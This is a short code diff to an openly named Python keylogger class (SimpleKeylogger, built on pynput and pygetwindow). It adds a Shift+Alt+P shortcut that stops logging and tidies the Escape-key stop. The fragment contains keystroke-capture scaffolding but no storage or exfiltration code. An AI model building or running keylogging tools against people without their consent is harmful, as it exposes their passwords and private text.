@@ -1,3 +1,5 @@
+from keyboard import is_pressed
+
 from keylogger.interfaces import IKeylogger
 from pynput import keyboard
 import pygetwindow as gw
@@ -56,6 +58,8 @@ class SimpleKeylogger(IKeylogger):
         Args:
             key (keyboard.Key or keyboard.KeyCode): The pressed key.
         """
+        if is_pressed("shift+alt+p"):  # TODO: Modify the shortcut, and better implementation maybe.
+            self.stop()
         try:
             key_pressed = key_to_char(key)
         except Exception as e:
@@ -75,7 +79,7 @@ class SimpleKeylogger(IKeylogger):
         Args:
             key (keyboard.Key): The released key.
         """
-        if key == keyboard.Key.esc:  # TODO: change to other keys maybe a shortcut
+        if key == keyboard.Key.esc:
             self.stop()
 
     def start(self):
